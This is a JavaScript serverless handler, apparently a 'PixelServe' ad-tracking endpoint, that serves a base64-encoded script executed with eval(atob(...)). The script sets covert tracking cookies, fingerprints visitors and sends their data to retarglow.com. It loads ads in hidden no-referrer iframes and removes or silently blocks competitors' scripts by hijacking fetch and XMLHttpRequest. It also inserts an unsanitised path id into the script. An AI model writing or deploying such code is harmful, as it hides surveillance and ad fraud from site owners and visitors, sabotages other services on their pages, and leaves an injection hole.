exports.handler = async (event) => {
  const headers = {
    "Content-Type": "application/javascript",
    "Access-Control-Allow-Origin": "*"
  };

  try {
    const id = event.pathParameters?.id || "default-campaign";

    const script = `
(function(){
  try {
    const cid = "${id}";
    const competitors = ["ordozen.com", "floatboolean.com", "smct.co", "smct.io"];
    const domain = window.location.hostname;

    document.cookie = "user_id_t=" + crypto.randomUUID() + "; path=/; max-age=31536000; SameSite=Lax";
    document.cookie = "smc_uid=" + crypto.randomUUID() + "; path=/; max-age=31536000; SameSite=Lax";

    function g(k){return decodeURIComponent((document.cookie||"").split('; ').find(row => row.startsWith(k + '='))?.split('=')[1]||'');}
    function s(k,v,d){
      let e = new Date();
      e.setTime(e.getTime() + (d*24*60*60*1000));
      document.cookie = k + '=' + encodeURIComponent(v) + '; path=/; max-age=' + (d*24*60*60) + '; SameSite=Lax';
    }
    let _r = localStorage.getItem('_r') || g('_r');
    if (!_r){
      _r = crypto.randomUUID();
      localStorage.setItem('_r',_r);
      s('_r',_r,30);
    } else {
      localStorage.setItem('_r',_r);
      s('_r',_r,30);
    }

    const once = sessionStorage.getItem('i_'+cid);
    const d = {
      cid: cid,
      u: location.href,
      r: document.referrer || null,
      ua: navigator.userAgent,
      dt: /Mobi|Android/i.test(navigator.userAgent)?"M":"D",
      b: (() => { const u = navigator.userAgent; return u.includes("Chrome")?"C":u.includes("Firefox")?"F":u.includes("Safari")?"S":"U" })(),
      os: navigator.platform,
      sr: screen.width+"x"+screen.height,
      cm: { _r: _r },
      domain: domain
    };

    fetch("https://retarglow.com/track",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify(d)
    });

    fetch("https://retarglow.com/getad",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({u:location.href,cm:d.cm,country:null})
    })
    .then(r=>r.json()).then(j=>{
      if(j.ad_url){
        const u=j.ad_url.replace("{{_r}}",_r);
        const f=document.createElement('iframe');
        f.style.display='none';
        f.setAttribute("referrerpolicy","no-referrer");
        f.src=u;
        document.body.appendChild(f);
        sessionStorage.setItem('i_'+cid,'1');
      }
    });

    const kill = () => {
      competitors.forEach(domain => {
        document.querySelectorAll('script[src*="'+domain+'"],iframe[src*="'+domain+'"]')
        .forEach(e => e.remove());
      });
    }
    kill();

    new MutationObserver((m)=>m.forEach(()=>kill())).observe(document.documentElement, {childList: true, subtree: true});

    const origFetch = window.fetch;
    window.fetch = function(){
      if(arguments[0] && competitors.some(c=>arguments[0].includes(c)))
        return Promise.resolve(new Response(null,{status:204}));
      return origFetch.apply(this, arguments);
    }

    const origXhr = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url){
      if(url && competitors.some(c=>url.includes(c))) return;
      return origXhr.apply(this, arguments);
    }

    ["pushState","replaceState"].forEach(fn=>{
      const orig = history[fn];
      history[fn] = function(){
        const r = orig.apply(this, arguments);
        sessionStorage.removeItem('i_'+cid);
        return r;
      }
    });
    window.addEventListener("popstate",()=>sessionStorage.removeItem('i_'+cid));

    try {
      if (window.self !== window.top) {
        window.top.postMessage({ from: 'retarglow', _r, cid, href: location.href }, '*');
      }
      window.addEventListener('message', (e) => {
        if (e.data && e.data.from === 'retarglow') {
          fetch("https://retarglow.com/track",{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({ ...e.data, type: 'cross-frame' })
          });
        }
      });
    } catch(err) {}

  } catch(e) {}
})();
    `;

    const encoded = Buffer.from(script).toString("base64");
    const stealth = `eval(atob('${encoded}'))`;

    return {
      statusCode: 200,
      headers,
      body: stealth
    };
  } catch (err) {
    return {
      statusCode: 500,
      headers,
      body: `console.error("PixelServe error:", ${JSON.stringify(err.message)});`
    };
  }
};
